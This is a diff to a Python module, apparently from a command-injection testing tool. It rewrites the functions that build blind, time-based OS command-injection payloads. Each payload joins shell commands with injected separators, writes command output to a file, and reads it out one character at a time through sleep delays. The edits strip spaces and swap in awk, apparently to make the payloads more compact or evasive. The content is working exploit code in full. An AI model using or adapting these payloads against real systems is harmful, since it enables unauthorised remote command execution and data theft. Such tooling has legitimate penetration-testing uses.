@@ -85,12 +85,12 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       else:
         ampersand = "&"
       payload = (ampersand +
-                "sleep 0 " + separator +
-                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ") " + separator +
-                "str=$(cat " + OUTPUT_TEXTFILE + ") " + separator +
+                "sleep 0" + separator +
+                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
+                "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 "str1=${#str} " + separator +
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
-                "sleep " + str(timesec) + " "
+                "sleep " + str(timesec)
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -98,9 +98,11 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + 
-                "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + pipe + "tr -d '\\n'" + pipe + "wc -c) ] " + separator +
-                "sleep " + str(timesec) + " "
+                "echo " + TAG + ">" + OUTPUT_TEXTFILE + pipe + 
+                "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + 
+                pipe + "tr -d '\\n'" + 
+                pipe + "wc -c) ] " + separator +
+                "sleep " + str(timesec)
                 )  
     else:
       pass
@@ -285,16 +287,16 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
         ampersand = "&"
       payload = (ampersand +
                 "sleep 0 " + separator +
-                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
-                "echo $str > " + OUTPUT_TEXTFILE + separator +
+                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr -d '\\n'<" + OUTPUT_TEXTFILE + ")" + separator +
+                "echo $str >" + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
-                "str1=${#str} " + separator +
+                "str1=${#str}" + separator +
                 "[ " + str(j) + " -eq ${str1} ]" + separator +
-                "sleep " + str(timesec) + separator + " "
+                "sleep " + str(timesec) + separator +
                 # Transform to ASCII
-                "str1=$(od -A n -t d1 < " +OUTPUT_TEXTFILE + ")" + separator +
-                "echo $str1 > " + OUTPUT_TEXTFILE 
+                "str1=$(od -A n -t d1<" + OUTPUT_TEXTFILE + ")" + separator +
+                "echo $str1 >" + OUTPUT_TEXTFILE 
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -302,9 +304,10 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
     elif separator == "||" :                
       pipe = "|"
       payload = (pipe +
-                "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " " + pipe + 
-                "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + pipe + "tr -d '\\n'" + pipe + "wc -c) ] " + separator +
-                "sleep " + str(timesec) + " "
+                "echo $(" + cmd.rstrip() + ")>" + OUTPUT_TEXTFILE + pipe + 
+                "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + pipe + 
+                "tr -d '\\n'" + pipe + "wc -c) ]" + separator +
+                "sleep " + str(timesec)
                 )                    
     else:
       pass
@@ -462,11 +465,11 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       else:
         ampersand = "&"
       payload = (ampersand +
-                "sleep 0 " +  separator +
+                "sleep 0" +  separator +
                 # Use space as delimiter
-                "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE +  ")" + separator +
+                "str=$(awk '{print$" + str(num_of_chars) + "}'<" + OUTPUT_TEXTFILE +  ")" + separator +
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
-                "sleep " + str(timesec) + " "
+                "sleep " + str(timesec)
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -474,8 +477,13 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator +
-                "sleep " + str(timesec) + " "
+                "[ " + str(ascii_char) + " -ne $(cat " + OUTPUT_TEXTFILE + 
+                pipe + "tr -d '\\n'" + 
+                pipe + "cut -c " + str(num_of_chars) + 
+                pipe + "od -N 1 -i" + 
+                pipe + "head -1" + 
+                pipe + "awk '{print$2}') ] " + separator +
+                "sleep " + str(timesec)
                 )
     else:
       pass
@@ -617,10 +625,10 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
       else:
         ampersand = "&"
       payload = (ampersand +
-                "sleep 0 " +  separator +
-                "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ") " + separator +
+                "sleep 0" +  separator +
+                "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator +
                 "[ " + str(ord(str(ascii_char))) + " -eq ${str} ] " +  separator +
-                "sleep " + str(timesec) + " "
+                "sleep " + str(timesec)
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -629,7 +637,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
       pipe = "|"
       payload = (pipe +
                 "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + ") ] " + separator +
-                "sleep " + str(timesec) + " "
+                "sleep " + str(timesec)
                 )
     else:
       pass
